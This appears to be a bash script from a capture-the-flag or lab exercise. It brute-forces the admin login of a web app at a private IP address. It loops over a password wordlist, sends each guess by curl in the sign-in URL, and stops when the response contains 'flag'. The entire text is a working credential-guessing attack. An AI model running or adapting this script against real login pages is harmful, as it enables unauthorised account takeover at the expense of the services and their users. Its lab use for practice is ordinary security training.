wlist="./word.txt"
while IFS= read -r pass
do
	var=`curl http://10.11.100.177/index.php\?page\=signin\&username\=admin\&password\=$pass\&Login\=Login\# 2>/dev/null | grep "flag"`
	echo "$pass"
	if [ -n "$var" ]
	then
		echo "done! the password is $pass"
		exit 1
	fi
done < "$wlist"
